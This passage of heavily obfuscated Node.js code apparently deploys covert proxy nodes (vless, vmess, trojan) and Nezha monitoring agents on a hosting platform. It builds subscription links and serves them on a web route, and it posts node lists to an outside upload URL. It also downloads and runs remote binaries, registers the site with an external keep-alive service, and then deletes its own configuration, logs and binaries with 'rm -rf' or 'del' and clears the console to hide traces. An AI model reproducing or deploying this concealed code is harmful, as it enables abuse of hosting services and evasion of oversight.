                const _0x361ea4 = '\x0a\x76\x6c\x65\x73\x73\x3a\x2f\x2f' + UUID + '\x40' + CFIP + '\x3a' + CFPORT + (_0x386f4d(0x210) + _0x386f4d(0x286) + _0x386f4d(0x219) + _0x386f4d(0x184)) + _0x307b24 + (_0x386f4d(0x2b4) + _0x386f4d(0x188) + _0x386f4d(0x1fa)) + _0x307b24 + ('\x26\x70\x61\x74\x68\x3d\x25\x32\x46\x76' + _0x386f4d(0x2c6) + _0x386f4d(0x213) + '\x30\x23') + _0x11027a + ('\x0a\x20\x20\x0a\x76\x6d\x65\x73\x73\x3a' + '\x2f\x2f') + Buffer[_0x386f4d(0x2ab)](JSON[_0x386f4d(0x2b9)](_0x2f5a1d))['\x74\x6f\x53\x74\x72\x69\x6e\x67'](_0x386f4d(0x19f)) + (_0x386f4d(0x22f) + '\x3a\x2f\x2f') + UUID + '\x40' + CFIP + '\x3a' + CFPORT + (_0x386f4d(0x1dc) + _0x386f4d(0x294)) + _0x307b24 + ('\x26\x66\x70\x3d\x66\x69\x72\x65\x66\x6f' + _0x386f4d(0x188) + '\x68\x6f\x73\x74\x3d') + _0x307b24 + ('\x26\x70\x61\x74\x68\x3d\x25\x32\x46\x74' + _0x386f4d(0x2c9) + '\x25\x33\x46\x65\x64\x25\x33\x44\x32\x35' + _0x386f4d(0x2ba)) + _0x11027a + _0x386f4d(0x20a);
                console[_0x386f4d(0x207)](Buffer[_0x386f4d(0x2ab)](_0x361ea4)[_0x386f4d(0x237)](_0x386f4d(0x19f)));
                fs[_0x386f4d(0x1d1) + '\x79\x6e\x63'](subPath, Buffer[_0x386f4d(0x2ab)](_0x361ea4)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](_0x386f4d(0x19f)));
                console[_0x386f4d(0x207)](FILE_PATH + (_0x386f4d(0x180) + _0x386f4d(0x270) + _0x386f4d(0x242)));
                uploadNodes();
                app[_0x386f4d(0x1e2)]('\x2f' + SUB_PATH, (_0x3ed0e6, _0x41f5eb) => {
                    const _0x52d1f6 = _0x386f4d;
                    const _0x14ed93 = Buffer['\x66\x72\x6f\x6d'](_0x361ea4)[_0x52d1f6(0x237)](_0x52d1f6(0x19f));
                    _0x41f5eb['\x73\x65\x74']('\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79' + '\x70\x65', _0x52d1f6(0x1d7) + _0x52d1f6(0x19e) + _0x52d1f6(0x278));
                    _0x41f5eb[_0x52d1f6(0x29c)](_0x14ed93);
                });
                _0x4a646a(_0x361ea4);
            }, 0x7d0);
        });
    }
}
async function uploadNodes() {
    const _0x4f910d = _0x3d7aff;
    if (UPLOAD_URL && PROJECT_URL) {
        const _0x158801 = PROJECT_URL + '\x2f' + SUB_PATH;
        const _0x1ce7d4 = { '\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6f\x6e': [_0x158801] };
        try {
            const _0x3c4d75 = await axios[_0x4f910d(0x1e7)](UPLOAD_URL + (_0x4f910d(0x2cb) + _0x4f910d(0x182) + '\x6e\x73'), _0x1ce7d4, { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': _0x4f910d(0x1cc) + _0x4f910d(0x234) } });
            if (_0x3c4d75 && _0x3c4d75[_0x4f910d(0x2bc)] === 0xc8) {
                console[_0x4f910d(0x207)](_0x4f910d(0x2c2) + _0x4f910d(0x28f) + _0x4f910d(0x1e3) + _0x4f910d(0x296));
                return _0x3c4d75;
            } else {
                return null;
            }
        } catch (_0x399f13) {
            if (_0x399f13[_0x4f910d(0x26b)]) {
                if (_0x399f13['\x72\x65\x73\x70\x6f\x6e\x73\x65'][_0x4f910d(0x2bc)] === 0x190) {
                }
            }
        }
    } else if (UPLOAD_URL) {
        if (!fs['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](listPath))
            return;
        const _0x3cf2f5 = fs[_0x4f910d(0x221) + '\x6e\x63'](listPath, _0x4f910d(0x278));
        const _0x1b757d = _0x3cf2f5['\x73\x70\x6c\x69\x74']('\x0a')['\x66\x69\x6c\x74\x65\x72'](_0xa7a0e0 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f910d(0x1ca)](_0xa7a0e0));
        if (_0x1b757d[_0x4f910d(0x1a4)] === 0x0)
            return;
        const _0x4d9bf1 = JSON[_0x4f910d(0x2b9)]({ '\x6e\x6f\x64\x65\x73': _0x1b757d });
        try {
            const _0x20015e = await axios[_0x4f910d(0x1e7)](UPLOAD_URL + (_0x4f910d(0x274) + _0x4f910d(0x24e)), _0x4d9bf1, { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f' + _0x4f910d(0x234) } });
            if (_0x20015e && _0x20015e['\x73\x74\x61\x74\x75\x73'] === 0xc8) {
                console['\x6c\x6f\x67'](_0x4f910d(0x2a1) + _0x4f910d(0x2bd) + '\x73\x73\x66\x75\x6c\x6c\x79');
                return _0x20015e;
            } else {
                return null;
            }
        } catch (_0x5c09ff) {
            return null;
        }
    } else {
        return;
    }
}
function cleanFiles() {
    setTimeout(() => {
        const _0x141319 = _0xec37;
        const _0x1937fc = [
            bootLogPath,
            configPath,
            webPath,
            botPath
        ];
        if (NEZHA_PORT) {
            _0x1937fc[_0x141319(0x185)](npmPath);
        } else if (NEZHA_SERVER && NEZHA_KEY) {
            _0x1937fc[_0x141319(0x185)](phpPath);
        }
        if (process[_0x141319(0x247)] === _0x141319(0x1d5)) {
            exec('\x64\x65\x6c\x20\x2f\x66\x20\x2f\x71\x20' + _0x1937fc[_0x141319(0x28a)]('\x20') + (_0x141319(0x1f8) + '\x31'), _0x44b9a5 => {
                const _0x1f06eb = _0x141319;
                console['\x63\x6c\x65\x61\x72']();
                console[_0x1f06eb(0x207)](_0x1f06eb(0x1b8) + _0x1f06eb(0x288));
                console[_0x1f06eb(0x207)](_0x1f06eb(0x191) + _0x1f06eb(0x1a7) + '\x74\x68\x69\x73\x20\x73\x63\x72\x69\x70' + _0x1f06eb(0x1f1));
            });
        } else {
            exec('\x72\x6d\x20\x2d\x72\x66\x20' + _0x1937fc['\x6a\x6f\x69\x6e']('\x20') + (_0x141319(0x17f) + '\x6c\x20\x32\x3e\x26\x31'), _0x53ca46 => {
                const _0x106bbe = _0x141319;
                console[_0x106bbe(0x2ca)]();
                console[_0x106bbe(0x207)](_0x106bbe(0x1b8) + _0x106bbe(0x288));
                console[_0x106bbe(0x207)]('\x54\x68\x61\x6e\x6b\x20\x79\x6f\x75\x20' + _0x106bbe(0x1a7) + _0x106bbe(0x1ea) + _0x106bbe(0x1f1));
            });
        }
    }, 0x15f90);
}
cleanFiles();
async function AddVisitTask() {
    const _0x2f1b96 = _0x3d7aff;
    if (!AUTO_ACCESS || !PROJECT_URL) {
        console[_0x2f1b96(0x207)]('\x53\x6b\x69\x70\x70\x69\x6e\x67\x20\x61' + '\x64\x64\x69\x6e\x67\x20\x61\x75\x74\x6f' + '\x6d\x61\x74\x69\x63\x20\x61\x63\x63\x65' + _0x2f1b96(0x189));
        return;
    }
    try {
        const _0x5a7223 = await axios[_0x2f1b96(0x1e7)](_0x2f1b96(0x24b) + _0x2f1b96(0x22a) + _0x2f1b96(0x215) + '\x6c', { '\x75\x72\x6c': PROJECT_URL }, { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': _0x2f1b96(0x1cc) + _0x2f1b96(0x234) } });
        console[_0x2f1b96(0x207)](_0x2f1b96(0x1e6) + _0x2f1b96(0x298) + '\x6b\x20\x61\x64\x64\x65\x64\x20\x73\x75' + '\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79');
        return _0x5a7223;
    } catch (_0x573045) {
        console[_0x2f1b96(0x18a)](_0x2f1b96(0x258) + _0x2f1b96(0x25b) + _0x2f1b96(0x297) + _0x2f1b96(0x281) + _0x573045['\x6d\x65\x73\x73\x61\x67\x65']);
        return null;
    }
}
async function startserver() {
    const _0x309c94 = _0x3d7aff;
    try {
        deleteNodes();
        cleanupOldFiles();
        await generateConfig();
        await downloadFilesAndRun();
        await extractDomains();
        await AddVisitTask();
    } catch (_0x59ed2a) {
        console[_0x309c94(0x18a)]('\x45\x72\x72\x6f\x72\x20\x69\x6e\x20\x73' + _0x309c94(0x19c) + '\x3a', _0x59ed2a);
    }
}
startserver()[_0x3d7aff(0x1bb)](_0x36a80b => {
    const _0x401a4d = _0x3d7aff;
    console[_0x401a4d(0x18a)]('\x55\x6e\x68\x61\x6e\x64\x6c\x65\x64\x20' + _0x401a4d(0x20b) + _0x401a4d(0x19c) + '\x3a', _0x36a80b);
});
app[_0x3d7aff(0x1fc)](PORT, () => console['\x6c\x6f\x67'](_0x3d7aff(0x209) + _0x3d7aff(0x1f5) + _0x3d7aff(0x2b5) + '\x3a' + PORT + '\x21'));
